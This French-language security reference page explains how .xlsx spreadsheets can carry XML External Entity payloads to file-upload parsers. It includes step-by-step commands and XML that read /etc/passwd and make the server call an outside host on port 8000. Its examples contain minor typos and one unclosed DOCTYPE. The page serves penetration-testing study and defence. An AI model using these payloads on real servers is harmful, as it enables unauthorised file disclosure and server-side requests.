# Office Open XML Spreadsheet

<img src="logo.png" title="" alt="" height="150">

**Facteur de risque** : XXE

**Extension** : `.xlsx`, `xlsm`

**Type MIME** : `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`

**Description** : 

**Office Open XML** (OOXML) est un format de fichier **zippé** et basé sur le **XML**, pour représenter des feuilles de calcul, des graphiques, des présentations et des documents de traitement de texte. 

`.xlsx` est une extension de nom de fichier pour tableur au format Office Open XML. `.xlsm` permet en plus l'utilisation des **macros**.

Un fichier `.xlsx` peut être désarchiver comme un fichier `.zip`. Il contient notamment plusieurs fichiers `.xml`. Microsoft conseille d'analyser dans l'ordre :

- le fichier `_rels/.rels`, qui contient les relations en reliant un ID à chaque fichier

- le fichier `[Content_Types].xml` qui contient une liste de type MIME

- le fichier `xl/workbook.xml`, qui donne une vue d'ensemble du contenu du classeur (nom des feuilles, etc.). La plupart du temps, les applications web analysent ce fichier en premier,

- les fichiers `xl/worksheets/sheet1.xml`, `xl/worksheets/sheet2.xml`... correspondent aux feuilles, avec les données numériques notamment,

- et le fichier `xl/sharedStrings.xml` contient les chaînes de caractères des différentes feuilles.

Un fichier Excel ou un fichier Google Sheets en `.xlsx` correspond donc en réalité à un fichier archive `.zip` contenant plusieurs fichiers `.xml`. Des payloads pour XXE peuvent être donc injectés dans les fichiers.

## Sommaire

- XML External Entity (XML)

## XML External Entity (XML)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé
- Le serveur web doit analyser et traiter les données du fichier.

### Exploitation

Créez un nouveau fichier Excel ou Google Sheets vide, puis enregistrez le fichier au format `.xlsx` (**xxe.xlsx**)

1. Déarchivez le fichier `.xlsx` dans un répertoire (**FichierMalveillant**) :
   
   ```shell
   unzip xxe.xlsx -d FichierMalveillant
   ```

2. Le payload XXE doit être ajouté dans le fichier `.xml` que l'application traitera (dans les fichiers `xl/workbook.xml`, `xl/worksheets/sheet1.xml`, `xl/sharedStrings.xml` notamment) :
   
   ```xml
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
   <!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
   <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="4" uniqueCount="4">
   <si><t>ABCD</t></si>
   <si><t>&xxe;</t></si>
   <si><t>FGHI</t></si>
   <si><t>IJKL</t></si>
   </sst>
   ```
   
   Ici, le payload a été placé dans le fichier `xl/sharedStrings.xml`, pour récupérer le contenu de `/etc/password`.
   
   ```xml
   <!DOCTYPE go [
   <!ENTITY % go2 SYSTEM "http://192.168.1.1:8000/XXE">
   %go2;
   ```
   
   Ici, si le parser de l'application est vulnérable au XXE, il va se connecter via HTTP au serveur web 192.168.1.1 sur le port 8000, en demandant le fichier `XXE`.

3. Archivez à nouveau le fichier `.xlsv`, puis téléversez-le. (Il faut savoir que le fichier est techniquement correct d'après les spécifications, mais Office n'ouvrira pas le fichier). 
   
   ```shell
   zip -r xxe.xlsx FichierMalveillant/*
   ```
   
   ou
   
   ```shell
   zip -u xxe.xlsx xl/sharedStrings.xml
   ```

## References

- Exploiting XXE Vulnerabilities In File Parsing Functionality - YouTube : https://www.youtube.com/watch?v=LZUlw8hHp44
- Black Hat | WebCast: Exploiting XML Entity Vulnerabilities in File Parsing Functionality : https://www.blackhat.com/html/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.html
- GitHub - BuffaloWill/oxml_xxe: A tool for embedding XXE/XML exploits into different filetypes : https://github.com/BuffaloWill/oxml_xxe
- Exploiting XXE with Excel : https://www.4armed.com/blog/exploiting-xxe-with-excel/
- XXE injection is possible via specially crafted excel file : https://github.com/jmcnamara/excel-reader-xlsx/issues/10
- XXE at Bol.com : https://medium.com/@jonathanbouman/xxe-at-bol-com-7d331186de54]
- XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer) | INTEGRITY Labs : https://labs.integrity.pt/articles/xxe-all-the-things-including-apple-ioss-office-viewer/index.html

## Todo

- AJouter un payload dans `xl/workbook.xml` et `xl/worksheets/sheet1.xml` (voir XXE at Bol.com)

- Ajouter un payload dans le fichier `[Content_Types].xml`

- an Excel file with a dangerous formula

- Ajouter pour les formats SVG, Libre Office ou Open Office (`word/document.xml` -> `content.xml`), et SVG à l'internieur de LIbre ou Open
